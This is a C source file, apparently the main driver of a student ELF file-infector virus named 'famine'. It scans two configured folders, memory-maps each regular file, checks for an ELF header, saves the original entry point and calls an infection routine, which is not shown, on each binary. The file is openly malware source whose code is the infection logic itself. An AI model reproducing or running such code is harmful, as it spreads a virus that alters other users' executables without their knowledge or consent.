/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mabouce <ma.sithis@gmail.com>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/07/26 12:12:08 by mabouce           #+#    #+#             */
/*   Updated: 2021/07/27 15:36:48 by mabouce          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "famine.h"

int get_binary_data(char *file_name, t_famine *famine)
{
    double binary_data_size;
    int fd;
    struct stat FileAttrib;

    // Checking file is a regular file.
    if (stat(file_name, &FileAttrib) < 0)
    {
        return error(ERROR_STAT, famine);
    }
    else if ((FileAttrib.st_mode & S_IFMT) != S_IFREG)
    {
        return error(ERROR_NOT_A_REGULAR_FILE, famine);
    }

    if ((fd = open(file_name, O_RDWR)) == -1)
    {
        return error(ERROR_OPEN, famine);
    }

    if ((binary_data_size = lseek(fd, 0, SEEK_END)) != -1)
    {
        famine->binary_data_size = (size_t)binary_data_size;
        // Go back to the start of the file.
        if (lseek(fd, 0, SEEK_SET) != 0)
        {
            return (close(fd) == -1 ? error(ERROR_CLOSE, famine) : error(ERROR_LSEEK, famine));
        }
        // Copy binary address map
        if (!(famine->mmap_ptr = mmap(0, famine->binary_data_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)))
        {
            return (close(fd) == -1 ? error(ERROR_CLOSE, famine) : error(ERROR_MMAP, famine));
        }
        return 0;
    }
    else
    {
        return (close(fd) == -1 ? error(ERROR_CLOSE, famine) : error(ERROR_LSEEK, famine));
    }
}

int write_famine_file(t_famine *famine, const char *file_name)
{
    (void)famine;
    (void)file_name;
    return 0;

    // int fd;

    // if ((fd = open(file_name, O_WRONLY | O_CREAT, S_IRWXU)) < 0)
    // {
    //     return error(ERROR_OPEN, famine);
    // }
    // if ((write(fd, famine->infected_file, famine->infected_file_size)) < 0)
    // {
    //     return (close(fd) == -1 ? error(ERROR_CLOSE, famine) : error(ERROR_WRITE, famine));
    // }
    // return (close(fd) == -1 ? error(ERROR_CLOSE, famine) : 0);
}

int infect_file_in_folder(const char *path)
{
    struct dirent *dp;
    DIR *dir = opendir(path);
    t_famine *famine;
    char *input_file_name;

    // // TODO REMOVE LINE BELLOW
    // char *output_file_name;

    // Unable to open directory stream
    if (!dir)
    {
        if (DEBUG == true)
            printf("Unable to open the directory in the following path : %s\n", path);
        return ERROR_OPENDIR;
    }

    while ((dp = readdir(dir)) != NULL)
    {
        if (!(famine = (t_famine *)malloc(sizeof(t_famine))))
        {
            free(dir);
            return error(ERROR_MALLOC_FAMINE_STRUCT, famine);
        }
        set_famine_ptrs_to_null(famine);

        if (!(input_file_name = concat_strings(path, dp->d_name)))
        {
            free(dir);
            return error(ERROR_CONCAT_STRINGS, famine);
        }
        if (DEBUG == true)
            printf("input_file_name = %s\n", input_file_name);
        if (get_binary_data(input_file_name, famine) || check_elf_header(famine))
        {
            if (DEBUG == true)
                printf("Wrong file type, continuing.\n");
            free(input_file_name);
            continue;
        }
        free(input_file_name);

        famine->ehdr = (t_elf_ehdr *)famine->mmap_ptr;
        famine->old_entry_point = famine->ehdr->e_entry;
        famine->phdr = (t_elf_phdr *)((famine->mmap_ptr + famine->ehdr->e_phoff));
        famine->shdr = (t_elf_shdr *)((famine->mmap_ptr + famine->ehdr->e_shoff));
        apply_infection(famine);

        // TODO REMOVE LINE BELLOW
        // output_file_name = concat_strings("./infected_file/", dp->d_name);
        // if (DEBUG == true)
        // printf("output filename = %s\n", output_file_name);
        // write_famine_file(famine, output_file_name);
        // free(output_file_name);
        free_famine(famine);
    }

    if (closedir(dir) == -1)
    {
        free(dir);
        return ERROR_CLOSEDIR;
    }
    return 0;
}

int main(void)
{
    int ret;

    // TODO REMOVE LINE BELLOW
    // mkdir("./infected_file/", S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);

    if (((ret = infect_file_in_folder(FOLDER_TO_INFECT_ONE)) && ret != ERROR_OPENDIR) ||
        ((ret = infect_file_in_folder(FOLDER_TO_INFECT_TWO)) && ret != ERROR_OPENDIR))
        return ret;
    return 0;
}
